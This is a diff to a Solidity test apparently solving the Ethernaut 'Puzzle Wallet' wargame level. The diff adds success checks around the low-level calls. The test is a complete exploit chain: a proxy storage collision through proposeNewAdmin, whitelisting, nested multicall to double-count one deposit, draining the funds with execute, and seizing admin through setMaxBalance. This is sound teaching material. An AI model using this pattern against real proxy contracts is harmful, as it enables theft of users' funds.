@@ -33,7 +33,10 @@ contract PuzzleWalletTest is DSTest {
         PuzzleProxy puzzleProxy = PuzzleProxy(instance);
         puzzleProxy.proposeNewAdmin(eoa);
 
-        instance.call(abi.encodeWithSignature("addToWhitelist(address)", eoa));
+        (bool addToWhitelistSuccess, ) = instance.call(
+            abi.encodeWithSignature("addToWhitelist(address)", eoa)
+        );
+        require(addToWhitelistSuccess, "addToWhitelist() failed");
 
         bytes[] memory data = new bytes[](1);
         data[0] = abi.encodeWithSignature("deposit()");
@@ -42,11 +45,12 @@ contract PuzzleWalletTest is DSTest {
         data2[0] = abi.encodeWithSignature("multicall(bytes[])", data);
         data2[1] = abi.encodeWithSignature("deposit()");
 
-        instance.call{value: 0.001 ether}(
+        (bool multicallSuccess, ) = instance.call{value: 0.001 ether}(
             abi.encodeWithSignature("multicall(bytes[])", data2)
         );
+        require(multicallSuccess, "multicall() failed");
 
-        instance.call(
+        (bool executeSuccess, ) = instance.call(
             abi.encodeWithSignature(
                 "execute(address,uint256,bytes)",
                 eoa,
@@ -54,8 +58,12 @@ contract PuzzleWalletTest is DSTest {
                 ""
             )
         );
+        require(executeSuccess, "execute() failed");
 
-        instance.call(abi.encodeWithSignature("setMaxBalance(uint256)", 69));
+        (bool setMaxBalanceSuccess, ) = instance.call(
+            abi.encodeWithSignature("setMaxBalance(uint256)", 69)
+        );
+        require(setMaxBalanceSuccess, "setMaxBalance() failed");
 
         assertTrue(ethernaut.submitLevelInstance(instance));
 
